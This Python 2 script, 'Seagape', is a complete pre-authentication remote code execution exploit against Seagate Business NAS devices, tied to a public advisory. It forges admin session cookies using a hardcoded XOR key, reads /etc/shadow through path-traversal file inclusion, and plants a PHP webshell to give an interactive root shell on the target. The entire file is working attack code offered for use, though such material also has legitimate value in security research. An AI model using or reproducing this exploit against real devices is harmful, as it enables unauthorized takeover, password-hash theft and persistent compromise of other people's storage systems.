#!/usr/bin/env python
#
# Seagape
# =======
# Seagate Business NAS pre-authentication remote code execution
# exploit as root user.
#
# by OJ Reeves (@TheColonial) - for full details please see
# https://beyondbinary.io/advisory/seagate-nas-rce/
#
# Usage
# =====
# seagape.py <ip> <port> [-c [ua]]
#
# - ip   : ip or host name of the target NAS
# - port : port of the admin web ui
# - -c   : (optional) create a cookie which will give admin access.
#          Not specifying this flag results in webshell installation.
# - ua   : (optional) the user agent used by the browser for the
#          admin session (UA must match the target browser).
#          Default value is listed below
#
# Example
# =======
# Install and interact with the web shell:
# seagape.py 192.168.0.1 80
#
# Create admin cookie
# seagape.py 192.168.0.1 80 -c

import base64
import hashlib
import itertools
import os
import re
import socket
import sys
import urllib
import urllib2
import uuid
import xml.sax.saxutils

if len(sys.argv) < 3:
    print "Usage: {0} <ip> <port> [-c [user agent]]".format(sys.argv[0])
    sys.exit(1)

# Every Seagate nas has the same XOR key. Great.
XOR_KEY = '0f0a000d02011f0248000d290d0b0b0e03010e07'

# This is the User agent we'll use for most of the requests
DEFAULT_UA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10'

# This is the description we're going to be reading from
LFI_FILE = '/etc/devicedesc'

# the base globals that will hold our state
host = sys.argv[1]
port = int(sys.argv[2])
cis = ''
hostname = ''
webshell = str(uuid.uuid1()) + ".php"

def chunks(s, n):
    for i in xrange(0, len(s), n):
        yield s[i:i + n]

def forward_interleave(a, b):
    return ''.join(itertools.chain(*zip(itertools.cycle(a), b)))

def xor(s, k):
    return ''.join(chr(ord(a) ^ ord(b)) for a, b in itertools.izip(s, itertools.cycle(k)))

def sha1(s):
    return hashlib.sha1(s).hexdigest()

def decode(s):
    f = xor(s, XOR_KEY)
    return ''.join(chr(ord(a) ^ ord(b)) for a, b in chunks(f, 2))

def encode(s):
    s = forward_interleave(sha1(s), s)
    s = ''.join(a + chr(ord(a) ^ ord(b)) for a, b in chunks(s, 2))
    return xor(s, XOR_KEY)

def make_request(uri = "/", ci_session = None, headers = None, post_data = None):

    method = 'GET'

    if not headers:
        headers = {}

    headers['Host'] = host

    if 'User-Agent' not in headers:
        headers['User-Agent'] = DEFAULT_UA

    if 'Accept' not in headers:
        headers['Accept'] = 'text/html'

    if post_data:
        method = 'POST'
        post_data = urllib.urlencode(post_data)
        headers['Content-Type'] = 'application/x-www-form-urlencoded'

    if ci_session:
        ci_session = urllib.quote(base64.b64encode(encode(ci_session)))
        headers['Cookie'] = 'ci_session={0}'.format(ci_session)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    http  = ""
    http += "{0} {1} HTTP/1.1\r\n".format(method, uri)

    for h in headers:
        http += "{0}: {1}\r\n".format(h, headers[h])

    if post_data:
        http += "Content-Length: {0}\r\n".format(len(post_data))

    http += "\r\n"

    if post_data:
        http += post_data

    s.send(http)

    result = ""
    while True:
        data = s.recv(1024)
        if not data:
            break
        result += data

    s.close()

    return result

def get_ci_session():
    resp = make_request()

    for l in resp.split("\r\n"):
        m = re.findall("Set-Cookie: ([a-zA-Z0-9_\-]+)=([a-zA-Z0-9\+%=/]+);", l)
        for name, value in m:
            if name == 'ci_session' and len(value) > 40:
                return decode(base64.b64decode(urllib.unquote(value)))

    print "Unable to establish session with {0}".format(host)
    sys.exit(1)

def add_string(ci_session, key, value):
    prefix = 's:{0}:"{1}";s:'.format(len(key), key)
    if prefix in ci_session:
        ci_session = re.sub(r'{0}\d+:"[^"]*"'.format(prefix), '{0}{1}:"{2}"'.format(prefix, len(value), value), ci_session)
    else:
        # doesn't exist, so we need to add it to the start and the end.
        count = int(ci_session.split(':')[1]) + 1
        ci_session = re.sub(r'a:\d+(.*)}$', r'a:{0}\1{1}{2}:"{3}";}}'.format(count, prefix, len(value), value), ci_session)
    return ci_session

def set_admin(ci_session):
    return add_string(ci_session, "is_admin", "yes")

def set_language(ci_session, lang):
    return add_string(ci_session, "language", lang)

def include_file(ci_session, file_path):
    if file_path[0] == '/':
        file_path = '../../../../../..' + file_path
    return set_language(ci_session, file_path + "\x00")

def read_file(file_path, post_data = None):
    resp = make_request(ci_session = include_file(cis, file_path), headers = {}, post_data = post_data)
    return resp

def hashdump():
    shadow = read_file('/etc/shadow')
    for l in shadow.split("\n"):
        if l and ':!:' not in l and ':x:' not in l:
            parts = l.split(':')
            print "{0}:{1}".format(parts[0], parts[1])

def cmd(command):
    headers = {
        'Content-Type' : 'application/x-www-form-urlencoded',
        'Accept' : '*/*',
        'User-Agent' : DEFAULT_UA
    }

    post_data = urllib.urlencode({'c' : command})
    headers['Content-Type'] = 'application/x-www-form-urlencoded'

    ci_session = urllib.quote(base64.b64encode(encode(cis)))
    headers['Cookie'] = 'ci_session={0}'.format(ci_session)

    url = 'http://{0}:{1}/{2}'.format(host, port, webshell)
    req = urllib2.Request(url, headers = headers, data = post_data)

    return urllib2.urlopen(req).read()

def shell():
    running = True
    while running:
        c = raw_input("Shell ({0}) $ ".format(post_id))
        if c != 'quit' and c != 'exit':
            cmd(c)
        else:
            running = False

def show_admin_cookie(user_agent):
    ci_session = add_string(cis, 'is_admin', 'yes')
    ci_session = add_string(ci_session, 'username', 'admin')
    ci_session = add_string(ci_session, 'user_agent', user_agent)
    ci_session = urllib.quote(base64.b64encode(encode(ci_session)))
    print "Session cookies are bound to the browser's user agent."
    print "Using user agent: " + user_agent
    print "ci_session=" + ci_session

def show_version():
    print "Firmware Version: {0}".format(get_firmware_version())

def show_cookie():
    print cis

def show_help():
    print ""
    print "Seagape v1.0 -- Interactive Seagate NAS Webshell"
    print "  - OJ Reeves (@TheColonial) - https://beyondbinary.io/"
    print "  - https://beyondbinary.io/bbsec/001"
    print "==========================================================================="
    print "version           - Print the current firmware version to screen."
    print "dumpcookie        - Print the current cookie to screen."
    print "admincookie <ua>  - Create an admin login cookie (ua == user agent string)."
    print "                    Add to your browser and access ANY NAS box as admin."
    print "help              - Show this help."
    print "exit / quit       - Run for the hills."
    print "<anything else>   - Execute the command on the server."
    print ""

def execute(user_input):
    result = True
    parts = user_input.split(' ')
    c = parts[0]

    if c == 'admincookie':
        ua = DEFAULT_UA
        if len(parts) > 1:
            ua = ' '.join(parts[1:])
        show_admin_cookie(ua)
    elif c == 'dumpcookie':
        show_cookie()
    elif c == 'version':
        show_version()
    elif c == 'help':
        show_help()
    elif c == 'quit' or c == 'exit':
        remove_shell()
        result = False
    else:
        print cmd(user_input)
    return result

def get_firmware_version():
    resp = make_request("/index.php/mv_system/get_firmware?_=1413463189043",
            ci_session = acis)
    return resp.replace("\r", "").replace("\n", "").split("version")[1][1:-2]

def install_shell():
    resp = make_request("/index.php/mv_system/get_general_setup?_=1413463189043",
            ci_session = acis)
    existing_setup = ''
    for l in resp.split("\r\n"):
        if 'general_setup' in l:
            existing_setup = l
            break

    # generate the shell and its installer
    exec_post = base64.b64encode("<?php if(isset($_POST['c'])&&!empty($_POST['c'])){system($_POST['c']);} ?>")
    installer = '<?php file_put_contents(\'{0}\', base64_decode(\'{1}\')); ?>'.format(webshell, exec_post)
    write_php = xml.sax.saxutils.quoteattr(installer)[1:-1]
    start = existing_setup.index('" description="') + 15
    end = existing_setup.index('"', start)
    updated_setup = existing_setup[0:start] + write_php + existing_setup[end:]

    # write the shell to the description
    resp = make_request("/index.php/mv_system/set_general_setup?_=1413463189043",
            ci_session = acis,
            headers = { },
            post_data = { 'general_setup' : updated_setup })

    # invoke the installer
    read_file(LFI_FILE)

    # remove the installer
    resp = make_request("/index.php/mv_system/set_general_setup?_=1413463189043",
            ci_session = acis,
            headers = { },
            post_data = { 'general_setup' : existing_setup })

def remove_shell():
    return cmd('rm -f {0}'.format(webshell))

print "Establishing session with {0} ...".format(host)
cis = get_ci_session()

if len(sys.argv) >= 4 and sys.argv[3] == '-c':
    ua = DEFAULT_UA
    if len(sys.argv) > 4:
        ua = sys.argv[4]
    show_admin_cookie(ua)
else:
    print "Configuring administrative access ..."
    acis = add_string(cis, 'is_admin', 'yes')
    acis = add_string(acis, 'username', 'admin')

    print "Installing web shell (takes a while) ..."
    install_shell()

    print "Extracting id and hostname ..."
    identity = cmd('whoami').strip()
    hostname = cmd('cat /etc/hostname').strip()
    show_help()

    running = True
    while running:
        try:
            user_input = raw_input("Seagape ({0}@{1})> ".format(identity, hostname))
            running = execute(user_input)
        except:
            print "Something went wrong. Try again."